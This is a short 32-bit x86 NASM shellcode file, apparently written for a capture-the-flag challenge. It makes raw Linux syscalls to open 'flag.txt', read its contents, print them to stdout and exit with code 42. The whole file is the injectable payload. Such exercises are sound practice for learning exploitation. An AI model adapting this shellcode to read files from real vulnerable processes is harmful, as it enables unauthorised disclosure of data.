BITS 32
ORG 0
DEFAULT REL

entry:
    ; save ecx
    mov ebp, ecx
    .open:
    mov eax, 5
    mov ebx, filename
    add ebx, ebp
    xor ecx, ecx
    xor edx, edx
    int 0x80

    .read:
    mov ebx, eax
    mov eax, 3
    mov ecx, end
    add ecx, ebp
    xor edx, 0xff
    int 0x80

    .write:
    mov edx, eax
    mov eax, 4
    mov ebx, 1
    ; ecx = end
    int 0x80

    .exit:
	mov	eax, 1
	mov	ebx, 42
	int	0x80

filename: db "flag.txt", 0

times 0xff - ($ - $$) db 0

end:
 
